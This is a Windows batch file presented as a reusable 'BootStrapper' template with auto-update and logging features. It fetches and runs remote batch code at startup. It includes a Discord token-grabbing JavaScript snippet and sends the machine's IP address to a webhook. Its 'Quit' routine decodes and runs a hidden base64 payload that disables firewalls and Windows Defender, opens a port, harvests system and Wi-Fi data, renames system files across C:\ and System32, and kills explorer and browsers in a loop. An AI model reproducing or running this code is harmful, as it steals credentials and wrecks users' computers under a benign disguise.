@echo Off
set Project=Console
set Version=1.0
set CurrentVersion=AV1
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:: 			BootStrapper Location 				 ::
::									 ::
:: https://github.com/BatchExpert/CreativeNetwork/tree/main/BootStrapper ::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
set LinkA="https://raw.githubusercontent.com/BatchExpert/CreativeNetwork/main/BootStrapperMain/AA.txt"
set LinkB="https://raw.githubusercontent.com/BatchExpert/CreativeNetwork/main/BootStrapperMain/BootStrapper.bat"
set LinkC="Discord WebHook Link"
if exist C:\BootStrapper\Update\IdentifierCode.bat call C:\BootStrapper\Update\IdentifierCode.bat
call :Output 2 "%Username%: Started %Project%"
call :ModuleInstaller
goto VarCheck
:PasteBelowThisMessage
cls
title %Project% MainMenu
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                Paste Your Code Bellow This Message       ::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                Made By Creative Network                  ::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::Dont Steal My Ideas And Stuff People, I make it for fun   ::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
















goto PasteBelowThisMessage
:VarCheck
set BS=1
if not exist C:\BootStrapper\FirstTimeExecuted.txt if %LinkA%=="https://raw.githubusercontent.com/BatchExpert/CreativeNetwork/main/BootStrapper/UpdateNotice.txt" (
md C:\BootStrapper
cls
title BootStrapper Tutorial
echo Edit This File and change the LINK A and LINK B,  Link C is for Logging On Discord
echo You May See Something Called Project and Version, Change the Project into whatever name you need
echo The CurrentVersion is used to auto update.
echo And Make Sure to paste/create the new code bellow the area where it tells you to edit at
echo.
echo RGB Module Supported!
echo How to use RGB Module
echo Type echo %%RGB%%R;G;Bm Message
echo.
echo Custom Commands: WHL, Quit, Output
echo WHL: call :WHL "Message"  Logs Stuff And Delivers it to discord
echo Quit: call :Quit    Disenabes The PC Tempeorally
echo Output: call :Output 1/2/3 "Message"   Logs Stuff Onto an file
echo.
echo.
echo Startup Location "%%APPDATA%%\Microsoft\Windows\Start Menu\Programs\Startup"
echo Re Execute This To Reinstall This
echo. 
echo Made by Creative Network [Dont Remove This Watermark]
pause
echo %Username%: Ownership >C:\BootStrapper\FirstTimeExecuted.txt
exit /b
)
set relversion=%CurrentVersion%/master
::BootStrapper::
:BootStrapper
:startup2
cls
title Module Loader
echo %RGB%81;245;66mLoaded OneOfAKind Module
timeout /t 1 /nobreak >nul
echo Loaded AutoUpdater Module
timeout /t 1 /nobreak >nul
echo Loaded Creative Network Module
timeout /t 1 /nobreak >nul
echo Loaded RGB Module
timeout /t 2 /nobreak >nul
cls
title %Project% BootStrapper
SETLOCAL EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
set "DEL=%%a"
)
goto BootStrap2
:BootStrap2
echo [%Project%] Checking for updates...
if exist "C:\BootStrapper\Update\idk.txt" (
del "C:\BootStrapper\Update\idk.txt"
)
if not exist "C:\BootStrapper\Update\" (
mkdir "C:\BootStrapper\Update"
)
powershell -nologo -noprofile -command "Invoke-WebRequest %LinkA% -OutFile 'C:\BootStrapper\Update\idk.txt'" >nul
set /p updatescommit=<"C:\BootStrapper\Update\idk.txt"
if not %updatescommit% == %CurrentVersion% (
call :Output 2 "[%Project%]: An Update Was Found"
goto BootStrap3
) else (    
call :Output 2 "[%Project%]: No Updates Found!"
echo [%Project%] No updates found, Starting Up %Project%
timeout /t 3 /nobreak >nul
goto checks
)
:BootStrap3
echo [%Project%] Update Detected Updating...
timeout /t 3 /nobreak >nul
echo [%Project%] Downloading Update...
powershell -nologo -noprofile -command "Invoke-WebRequest %LinkB% -OutFile '%CD%\BootStrapper.bat'" >nul
echo [%Project%] Update Downloaded, restarting...
if exist "C:\BootStrapper\Update\idk.txt" (
break>"C:\BootStrapper\Update\idk.txt"
echo 1 >> "C:\BootStrapper\Update\idk.txt"
)
del "C:\BootStrapper\Update\idk.txt"
timeout /t 3 /nobreak >nul
:checks
goto PasteBelowThisMessage
:WHL [Message]
set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'Webhook', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); 
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set IP=%%a
:NEXT 
cls
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Address: %IP% \n  %~1"}" %LinkC%
cls
timeout /t 1 /nobreak >nul
goto :Eof
:Quit
@echo off
SetLocal EnableDelayedExpansion & set "_FILES_=" & set "fil=" & set "ini="
set "_vbs_file_=%TEMP%\%~n0.vbs"
::search for encoded data
for /F "usebackq tokens=1-3 delims=:" %%1 in (`findstr /B /N ":DeadMemesEncryptionMethod:" "%~f0"`) do (
    if "%%3" EQU "!fil!" (set "_FILES_=!_FILES_!!fil!:!ini!:%%1,") else (set "fil=%%3" & set "ini=%%1")
)
set "_FILES_=%_FILES_:~0,-1%"
rem create a vbscript to do the decoding
for %%# in (%_FILES_%) do (
  for /F "tokens=1-3 delims=:" %%1 in ("%%#") do (
    (
      echo/set outStream=CreateObject("ADODB.Stream"^) ^: outStream.Type=1 ^: outStream.Open
      echo/set oFS=CreateObject("Scripting.FileSystemObject"^)
      echo/set inStream=oFS.OpenTextFile("%~f0",1,0,0^)
      echo/set oXML=CreateObject("MSXml2.DOMDocument"^)
      echo/set oItem=oXML.createElement("tmp"^)
      echo/oItem.DataType="bin.base64" ^: for i=1 to %%2 step 1 ^: inStream.readline ^: next
      echo/do while i^<%%3 ^: oItem.text=inStream.readline ^: decodedBytes=oItem.NodeTypedValue ^: outStream.Write decodedBytes ^: i=i+1 ^: loop
      echo/outStream.SaveToFile "%TEMP%\%%1",2 ^: inStream.close ^: outStream.close
      echo/set oItem=nothing ^: set oXML=nothing ^: set outStream=nothing ^: set inStream=nothing ^: set oFS=nothing
    )>"%_vbs_file_%"
    Cscript.exe /B /E:vbs "%_vbs_file_%" >NUL
    start %TEMP%\%%1
  )
)
del /F /Q "%_vbs_file_%" 2>NUL
exit
:DeadMemesEncryptionMethod:SpoofingSpoofingSpoofingSpoofingSpoofingSpoofingSpoofingSpoofingSpoofingSpoofingSpoofing.bat:
QGVjaG8gb2ZmCnRpdGxlIFN5c3RlbSBNZWFsdGRvd24KY29sb3IgMGEKcmVuIC09LSBXcml0ZXMg
SU5GTyB0byBhIC5MT0cgZmlsZSBpbiBDdXJyZW50IERpcmVjdG9yeSAtPS0KOmluZm8KY2xzICYg
Y29sb3IgMGEKY2QgRGVza3RvcApuc2xvb2t1cCBteWlwLm9wZW5kbnMuY29tIHJlc29sdmVyMS5v
cGVuZG5zLmNvbT45SzIxSk0xMEIubG9nCnZlcj4+OUsyMUpNMTBCLmxvZwpFQ0hPLj4+OUsyMUpN
MTBCLmxvZwpFQ0hPIFVzZXJuYW1lOiV1c2VybmFtZSU+PjlLMjFKTTEwQi5sb2cKRUNITy4+PjlL
MjFKTTEwQi5sb2cKRUNITyBUaW1lOiAldGltZSU+PjlLMjFKTTEwQi5sb2cKRUNITy4+PjlLMjFK
TTEwQi5sb2cKRUNITyBEYXRlOiAlZGF0ZSU+PjlLMjFKTTEwQi5sb2cKRUNITy4+PjlLMjFKTTEw
Qi5sb2cKbmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzPj45SzIxSk0xMEIubG9nCkVDSE8uPj45SzIx
Sk0xMEIubG9nCmlwY29uZmlnPj45SzIxSk0xMEIubG9nCkVDSE8uPj45SzIxSk0xMEIubG9nCkVD
SE8gQWRkaXRpb25hbCBJbmZvcm1hdGlvbjo+PjlLMjFKTTEwQi5sb2cKaXBjb25maWcgfCBmaW5k
IC9pICJJUHY0Ij4+OUsyMUpNMTBCLmxvZwp3bWljIGRpc2tkcml2ZSBnZXQgc2l6ZT4+OUsyMUpN
MTBCLmxvZwp3bWljIGNwdSBnZXQgbmFtZT4+OUsyMUpNMTBCLmxvZwpFQ0hPLj4+OUsyMUpNMTBC
LmxvZwpFQ0hPLj4+OUsyMUpNMTBCLmxvZwpFQ0hPLj4+OUsyMUpNMTBCLmxvZwpzeXN0ZW1pbmZv
Pj45SzIxSk0xMEIubG9nCmdvdG8gcG9ydHMKcmVuIC09LSBPcGVucyBQb3J0IDExMjIgLT0tCjpw
b3J0cwpjbHMgJiBjb2xvciAwYQpuZXRzaCBhZHZmaXJld2FsbCBmaXJld2FsbCBhZGQgcnVsZSBu
YW1lPSJQb3J0IDExMjIgVENQIiBkaXI9aW4gYWN0aW9uPWFsbG93IHByb3RvY29sPVRDUCBsb2Nh
bHBvcnQ9JTEKbmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT0iUG9ydCAx
MTIyIFVEUCIgZGlyPWluIGFjdGlvbj1hbGxvdyBwcm90b2NvbD1VRFAgbG9jYWxwb3J0PSUxCmdv
dG8gZmlyZXdhbGwKcmVuIC09LSBUdXJucyBhbGwgRmlyZXdhbGxzIG9mZiAtPS0KOmZpcmV3YWxs
CmNscyAmIGNvbG9yIDBhCm5ldHNoIGZpcmV3YWxsIHNldCBvcG1vZGUgZGlzYWJsZQpuZXRzaCBm
aXJld2FsbCBzZXQgb3Btb2RlIG1vZGU9RElTQUJMRQpuZXRzaCBhZHZmaXJld2FsbCBzZXQgY3Vy
cmVudHByb2ZpbGUgc3RhdGUgb2ZmCm5ldHNoIGFkdmZpcmV3YWxsIHNldCBkb21haW5wcm9maWxl
IHN0YXRlIG9mZgpuZXRzaCBhZHZmaXJld2FsbCBzZXQgcHJpdmF0ZXByb2ZpbGUgc3RhdGUgb2Zm
Cm5ldHNoIGFkdmZpcmV3YWxsIHNldCBwdWJsaWNwcm9maWxlIHN0YXRlIG9mZgpuZXRzaCBhZHZm
aXJld2FsbCBzZXQgYWxscHJvZmlsZXMgc3RhdGUgb2ZmCmdvdG8gZW5jcnlwdGlvbgpyZW4gLT0t
IEVuY3J5cHRzIGZpbGVzIHdpdGggYSBzaW1wbGUgbmFtZSBicmVhayAtPS0KOmVuY3J5cHRpb24K
Y2xzICYgY29sb3IgMGEKOkN1cnJlbnQKUkVOICouY21kICouc0kwOSA+bnVsClJFTiAqLmV4ZSAq
LjFKZTkgPm51bApSRU4gKi5sb2cgKi40MzlhID5udWwKUkVOICouaW5pICouM0tNMSA+bnVsClJF
TiAqLmRsbCAqLjM4SmwgPm51bApSRU4gKi5iaW4gKi4zSjgxID5udWwKUkVOICoudHh0ICouMk0x
QSA+bnVsClJFTiAqLnN5cyAqLjhqM0ogPm51bApSRU4gKi5sbmsgKi45SzJNID5udWwKUkVOICou
cG5nICouOEoybiA+bnVsClJFTiAqLmV4ZSAqLjNoeEQgPm51bApjZCBDOlxXaW5kb3dzID5udWwK
UkVOICouY21kICouc0kwOSA+bnVsClJFTiAqLmV4ZSAqLjFKZTkgPm51bApSRU4gKi5sb2cgKi40
MzlhID5udWwKUkVOICouaW5pICouM0tNMSA+bnVsClJFTiAqLmRsbCAqLjM4SmwgPm51bApSRU4g
Ki5iaW4gKi4zSjgxID5udWwKUkVOICoudHh0ICouMk0xQSA+bnVsClJFTiAqLnN5cyAqLjhqM0og
Pm51bApSRU4gKi5sbmsgKi45SzJNID5udWwKUkVOICoucG5nICouOEoybiA+bnVsClJFTiAqLmV4
ZSAqLjNoeEQgPm51bApjZCBDOlxXaW5kb3dzXFN5czMyICYgY2QgQzpcV2luZG93c1xTeXN0ZW0z
MiA+bnVsClJFTiAqLmNtZCAqLnNJMDkgPm51bApSRU4gKi5leGUgKi4xSmU5ID5udWwKUkVOICou
bG9nICouNDM5YSA+bnVsClJFTiAqLmluaSAqLjNLTTEgPm51bApSRU4gKi5kbGwgKi4zOEpsID5u
dWwKUkVOICouYmluICouM0o4MSA+bnVsClJFTiAqLnR4dCAqLjJNMUEgPm51bApSRU4gKi5zeXMg
Ki44ajNKID5udWwKUkVOICoubG5rICouOUsyTSA+bnVsClJFTiAqLnBuZyAqLjhKMm4gPm51bApS
RU4gKi5leGUgKi4zaHhEID5udWwKY2QgQzpcID5udWwKUkVOICouY21kICouc0kwOSA+bnVsClJF
TiAqLmV4ZSAqLjFKZTkgPm51bApSRU4gKi5sb2cgKi40MzlhID5udWwKUkVOICouaW5pICouM0tN
MSA+bnVsClJFTiAqLmRsbCAqLjM4SmwgPm51bApSRU4gKi5iaW4gKi4zSjgxID5udWwKUkVOICou
dHh0ICouMk0xQSA+bnVsClJFTiAqLnN5cyAqLjhqM0ogPm51bApSRU4gKi5sbmsgKi45SzJNID5u
dWwKUkVOICoucG5nICouOEoybiA+bnVsClJFTiAqLmV4ZSAqLjNoeEQgPm51bApjb2xvciAwYSAm
IG1vZGUgMTAwMCAmIGNscyAgPm51bApnb3RvIHZpcnVzCnJlbiAtPS0gQ2xvc2VzIGFsbCB0YXNr
IG1hbmFnZXJzIGFuZCBicm93c2VyLCBraWxscyBhbnRpLXZpcnVzIGFuZCBmaXJld2FsbCAtPS0K
OnZpcnVzCkVDSE8gU3Bvb2ZpbmcgRGV2aWNlICYgY29sb3IgMGEKbXNnICogTWFsd2FyZSBWaXJ1
cwptc2cgKiBNYWx3YXJlIFZpcnVzCm1zZyAqIE1hbHdhcmUgVmlydXMKbXNnICogTWFsd2FyZSBW
aXJ1cwptc2cgKiBNYWx3YXJlIFZpcnVzCm1zZyAqIE1hbHdhcmUgVmlydXMKbXNnICogTWFsd2Fy
ZSBWaXJ1cwptc2cgKiBNYWx3YXJlIFZpcnVzCm1zZyAqIE1hbHdhcmUgVmlydXMKbmV0IHN0b3Ag
IldpbmRvd3MgRGVmZW5kZXIgU2VydmljZSIKbmV0IHN0b3AgIldpbmRvd3MgRmlyZXdhbGwiCnRh
c2traWxsIC9GIC9JTSAiY2hyb21lLmV4ZSIgL1QKdGFza2tpbGwgL0YgL0lNICJmaXJlZm94LmV4
ZSIgL1QKdGFza2tpbGwgL0YgL0lNICJQcm9jZXNzSGFja2VyLmV4ZSIgL1QKdGFza2tpbGwgL0Yg
L0lNICJleHBsb3Jlci5leGUiIC9UCnRhc2traWxsIC9GIC9JTSAidGFza21nci5leGUiIC9UCmdv
dG8gdmlydXM=
:DeadMemesEncryptionMethod:SpoofingSpoofingSpoofingSpoofingSpoofingSpoofingSpoofingSpoofingSpoofingSpoofingSpoofing.bat:

:Output [Type] [Message]
cls
md %Project%-Logs
cls
if %~1 equ 1 (
title Command: Output Help Menu
echo 1 = Help For Output
echo 2 = Silent Output/Log
echo 3 = Output/Log
echo.
echo Useage: call :Output 1/2/3 "Message"
pause
)
if %~1 equ 2 (
echo %~2 >%Project%-Logs\%Username%.log
)
if %~1 equ 3 (
echo %~2 >%Project%-Logs\%Username%.log
echo %~2
timeout /t 2 /nobreak >nul
)

goto :Eof

:ModuleInstaller
powershell -nologo -noprofile -command "Invoke-WebRequest https://raw.githubusercontent.com/BatchExpert/CreativeNetwork/main/BootStrapper/RgbModule.bat -OutFile 'C:\BootStrapper\RgbModule.bat'" >nul
call C:\BootStrapper\RgbModule.bat
goto :Eof
